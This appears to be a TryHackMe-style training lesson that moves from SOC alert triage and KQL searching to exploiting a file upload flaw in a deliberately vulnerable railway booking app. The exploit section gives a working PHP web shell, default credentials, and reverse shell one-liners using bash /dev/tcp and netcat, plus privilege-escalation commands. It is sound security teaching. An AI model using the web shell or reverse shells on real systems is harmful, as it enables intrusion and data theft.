# True Positives or False Positives?
In a SOC, events from different devices are sent to the SIEM, which is the single source of truth where all the information and events are aggregated. Certain rules (Detection Engineering rules) are defined to identify malicious or suspicious activity from these events. If an event or set of events fulfils the conditions of a rule, it triggers an alert. A SOC analyst then analyses the alert to identify if the alert is a True Positive (TP) or a False Positive (FP). An alert is considered a TP if it contains actual malicious activity. On the flip side, if the alert triggers because of an activity that is not actually malicious, it is considered an FP. This might seem very simple in theory, but practically, separating TPs from FPs can be a tedious job. It can sometimes become very confusing to differentiate between an attacker and a system administrator.
## Making a Decision
While it is confusing to differentiate between TPs and FPs, it is very crucial to get it right. If a TP is falsely classified as an FP, it can lead to a significant impact from a missed cyber attack. If an FP is falsely classified as a TP, precious time will be spent focusing on the FP, which might lead to less focus on an actual attack. So, how exactly do we ensure that we perform this crucial job effectively? We can use the below pointers to guide us.

﻿### Using the SOC Superpower
The SOC has a superpower. When they are unsure whether an activity is performed by a malicious actor or a legitimate user, they can just confirm with the user. This privilege is not available to the attacker. A SOC analyst, on the other hand, can just send an email or call the relevant person to get confirmation of a certain activity. In mature organisations, any changes that might trigger an alert in the SOC often require Change Requests to be created and approved through the IT change management process. Depending on the process, the SOC team can ask the users to share Change Request details for confirmation. Surely, if it is a legitimate and approved activity, it must have an approved Change Request.

### Context
While it might seem like using the SOC superpower makes things super easy, that is not always the case. There are cases which can act as Kryptonite to the SOC superpower:

- If an organisation doesn't have a change request process in place.
- The performed activity was outside the scope of the change request or was different from that of the approved change request.
- The activity triggered an alert, such as copying files to a certain location, uploading a file to some website, or a failed login to a system. 
- An insider threat performed an activity they are not authorised to perform, whether intentionally or unintentionally.
- A user performed a malicious activity via social engineering from a threat actor.

In such scenarios, it is very important for the SOC analyst to understand the context of the activity and make a judgement call based on their analysis skills and security knowledge. While doing so, the analyst can look at the past behaviour of the user or the prevalence of a certain event or artefact throughout the organisation or a certain department. For example, if a certain user from the network team is using Wireshark, there is a chance that other users from the same team also use Wireshark. However, Wireshark seen on a machine belonging to someone from HR or finance should rightfully raise some eyebrows.

### Correlation
When building the context, the analyst must correlate different events to make a story or a timeline. Correlation entails using the past and future events to recreate a timeline of events. When performing correlation, it is important to note down certain important artefacts that can then be used to connect the dots. These important artefacts can include IP addresses, machine names, user names, hashes, file paths, etc.

Correlation requires a lot of hypothesis creation and ensuring that the evidence supports that hypothesis. A hypothesis can be something like the user downloaded malware from a spoofed domain. The evidence to support this can be proxy logs that support the hypothesis that a website was visited, the website used a spoofed domain name, and a certain file was downloaded from that website. Now, let's say, we want to identify whether the malware executed through some vulnerability in an application or a user intentionally executed the malware. To see that, we might look at the parent process of the malware and the command line parameters used to execute the said malware. If the parent process is Windows Explorer, we can assume the user executed the malware intentionally (or they might have been tricked into executing it via social engineering), but if the parent process is a web browser or a word processor, we can assume that the malware was not intentionally executed, but it was executed because of a vulnerability in the said application.

---
## Kibana Query Language (KQL)

KQL, or Kibana Query Language, is an easy-to-use language that can be used to search documents for values. For example, querying if a value within a field exists or matches a value. If you are familiar with Splunk, you may be thinking of SPL (Search Processing Language).

For example, the query to search all documents for an IP address may look like `ip.address: "10.10.10.10"`.   

![IP address query](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/5de96d9ca744773ea7ef8c00-1731420515473.png)  

Alternatively, Kibana also allows using Lucene query, an advanced language that supports features such as fuzzy terms (searches for terms that are similar to the one provided), regular expressions, etc. For today's task, we will stick with using KQL, which has been enabled by default. The table below contains a mini-cheatsheet for KQL syntax that you may find helpful in today's task.

|   |   |   |
|---|---|---|
|**Query/Syntax**|**Description**|**Example**|
|" "|The two quotation marks are used to search for specific values within the documents. Values in quotation marks are used for **exact** searches.|"TryHackMe"|
|*|The asterisk denotes a wildcard, which searches documents for similar matches to the value provided.|United* (would return United Kingdom and United States)|
|OR|This logical operator is used to show documents that contain **either** of the values provided.|"United Kingdom" OR "England"|
|AND|This logical operator is used to show documents that contain **both** values.|"Ben" AND "25"|
|:|This is used to search the (specified) field of a document for a value, such as an IP address. Note that the field you provide here will depend on the fields available in the index pattern.|ip.address: 10.10.10.10|

---
## Why Do Websites Allow File Uploads

## 

File uploads are everywhere on websites, and for good reason. Users often need to upload files like profile pictures, invoices, or other documents to update their accounts, send receipts, or submit claims. These features make the user experience smoother and more efficient. But while this is convenient, it also creates a risk if file uploads aren't handled properly. If not properly secured, this feature can open up various vulnerabilities attackers can exploit.

## File Upload Vulnerabilities

File upload vulnerabilities occur when a website doesn't properly handle the files that users upload. If the site doesn't check what kind of file is being uploaded, how big it is, or what it contains, it opens the door to all sorts of attacks. For example:

- **RCE**: Uploading a script that the server runs gives the attacker control over it.  
    
- **XSS**: Uploading an HTML file that contains an XSS code which will steal a cookie and send it back to the attacker's server.

These can happen if a site doesn't properly secure its file upload functionality.

## Why Unrestricted File Uploads Are Dangerous

Unrestricted file uploads can be particularly dangerous because they allow an attacker to upload any type of file. If the file's contents aren't properly validated to ensure only specific formats like PNG or JPG are accepted, an attacker could upload a malicious script, such as a PHP file or an executable, that the server might process and run. This can lead to code execution on the server, allowing attackers to take over the system.

Examples of abuse through unrestricted file uploads include:

- Uploading a script that the server executes, leading to RCE.  
    
- Uploading a crafted image file that triggers a vulnerability when processed by the server.  
    
- Uploading a web shell and browsing to it directly using a browser.  
    

## Usage of Weak Credentials

One of the easiest ways for attackers to break into systems is through weak or default credentials. This can be an open door for attackers to gain unauthorised access. Default credentials are often found in systems where administrators fail to change initial login details provided during setup. For attackers, trying a few common usernames and passwords can lead to easy access.

Below are some examples of weak/default credentials that attackers might try:

|   |   |
|---|---|
|**Username**|**Password**|
|admin|admin|
|administrator|administrator|
|admin@domainname|admin|
|guest|guest|

Attackers can use tools or try these common credentials manually, which is often all it takes to break into the system.

## What is Remote Code Execution (RCE)

Remote code execution (RCE) happens when an attacker finds a way to run their own code on a system. This is a highly dangerous vulnerability because it can allow the attacker to take control of the system, exfiltrate sensitive data, or compromise other connected systems.

![Frosty Pines Hotel Key Graphic](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1730310085341.png)  

## What Is a Web Shell

A web shell is a script that attackers upload to a vulnerable server, giving them remote control over it. Once a web shell is in place, attackers can run commands, manipulate files, and essentially use the compromised server as their own. They can even use it to launch attacks on other systems.

For example, attackers could use a web shell to:

- Execute commands on the server  
    
- Move laterally within the network
- Download sensitive data or pivot to other services

A web shell typically gives the attacker a web-based interface to run commands. Still, in some cases, attackers may use a reverse shell to establish a direct connection back to their system, allowing them to control the compromised machine remotely. Once an attacker has this level of access, they might attempt privilege escalation to gain even more control, such as achieving root access or moving deeper into the network.

Okay, now that we're familiar with a remote code execution vulnerability and how it works, let's take a look at how we would exploit it!

## Practice Makes Perfect

To understand how a file upload vulnerability can result in an RCE, the best approach is to get some hands-on experience with it. A handy (and ethical) way to do this is to find and download a reputable open-source web application which has this vulnerability built into it. Many open-source projects exist in places like GitHub, which can be run in your own environment to experiment and practice. In today's task, we will demonstrate achieving RCE via unrestricted file upload within an [open-source railway management system](https://github.com/CYB84/CVE_Writeup/tree/main/Online%20Railway%20Reservation%20System) that has this vulnerability [built into it](https://github.com/CYB84/CVE_Writeup/blob/main/Online%20Railway%20Reservation%20System/RCE%20via%20File%20Upload.md).   

## Exploiting RCE via File Upload

Now we're going to go through how this vulnerability can be exploited. For now, you can just read along, but an opportunity to put this knowledge into practice is coming up. Once an RCE vulnerability has been identified that can be exploited via file upload, we now need to create a malicious file that will allow remote code execution when uploaded.

Below is an example PHP file which could be uploaded to exploit this vulnerability. Using your favourite text editor, copy and paste the below code and save it as shell.php.

```html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="command" autofocus id="command" size="50">
<input type="submit" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['command'])) 
    {
        system($_GET['command'] . ' 2>&1'); 
    }
?>
</pre>
</body>
</html>
```

The above script, when accessed, displays an input field. Whatever is entered in this input field is then run against the underlying operating system using the `system()` PHP function, and the output is displayed to the user. This is the perfect file to upload to the vulnerable rail system reservation application. The vulnerability is surrounding the upload of a new profile image. So, to exploit it, we navigate to the profile picture page:

![Railway profile page](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1728053142390.png)

Instead of a new profile picture, we can upload our malicious PHP script and update our profile:

![Profile picture uploaded](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1728053158718.png)  

In the case of this application, the RCE is possible through unrestricted file upload. Once this "profile picture" is uploaded and updated, it is stored in the `/admin/assets/img/profile/` directory. The file can then be accessed directly via `http://<ip-address-or-localhost>/<projectname>/admin/assets/img/profile/shell.php`. When this is accessed, we can then see the malicious code in action:

![Malicious code in action](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1728053358466.png)  

Now, we can run commands directly against the operating system using this bar, and the output will be displayed. For example, running the command `pwd` now returns the following:

![Command being run](https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1728053358453.png)  

## Making the Most of It

Once the vulnerability has been exploited and you now have access to the operating system via a web shell, there are many next steps you could take depending on **a)** what your goal is and **b)** what misconfigurations are present on the system, which will determine exactly what we can do. Here are some examples of commands you could run once you have gained access and why you might run them (if the system is running on a Linux OS like our example target system):  

|**Command**|**Use**|
|---|---|
|ls|Will give you an idea of what files/directories surround you|
|cat|A command used to output the contents of documents such as text files|
|pwd|Will give you an idea of where in the system you are|
|whoami|Will let you know who you are in the system|
|hostname|The system name and potentially its role in the network|
|uname -a|Will give you some system information like the OS, kernel version, and more|
|id|If the current user is assigned to any groups|
|ifconfig|Allows you to understand the system's network setup|
|bash -i >& /dev/tcp/<your-ip>/<port> 0>&1|A command used to begin a reverse shell via bash|
|nc -e /bin/sh <your-ip> <port>|A command used to begin a reverse shell via Netcat|
|find / -perm -4000 -type f 2>/dev/null|Finds SUID (Set User ID) files, useful in privilege escalation attempts as it can sometimes be leveraged to execute binary with privileges of its owner (which is often root)|
|find / -writable -type  f 2>/dev/null \| grep -v "/proc/"|Also helpful in privilege escalation attempts used to find files with writable permissions|

These are just some commands that can be run following a successful RCE exploit. It's very open-ended, and what you can do will rely on your abilities to inspect an environment and vulnerabilities in the system itself.